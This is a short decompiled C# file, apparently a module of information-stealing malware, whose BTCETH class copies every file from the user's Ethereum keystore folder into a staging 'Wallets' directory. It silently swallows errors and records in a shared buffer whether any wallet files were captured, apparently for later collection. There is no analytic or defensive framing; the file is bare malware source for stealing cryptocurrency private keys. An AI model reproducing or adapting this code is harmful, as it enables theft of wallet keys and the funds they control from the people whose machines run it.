using System;
using System.IO;

// Token: 0x02000005 RID: 5
internal class BTCETH
{
	// Token: 0x06000007 RID: 7 RVA: 0x00002378 File Offset: 0x00000578
	public static void Start()
	{
		string text = string.Format("{0}Wallets", global::Buffer.path_l);
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string path = string.Format("{0}Ethereum\\keystore", global::Buffer.path_ad);
			if (Directory.Exists(path))
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
				{
					fileInfo.CopyTo(text + "\\" + fileInfo.Name, true);
				}
			}
		}
		catch
		{
		}
		if (Directory.GetFiles(text).Length == 0)
		{
			global::Buffer.XBufferData[15] = "0";
			return;
		}
		global::Buffer.XBufferData[15] = "1";
	}
}
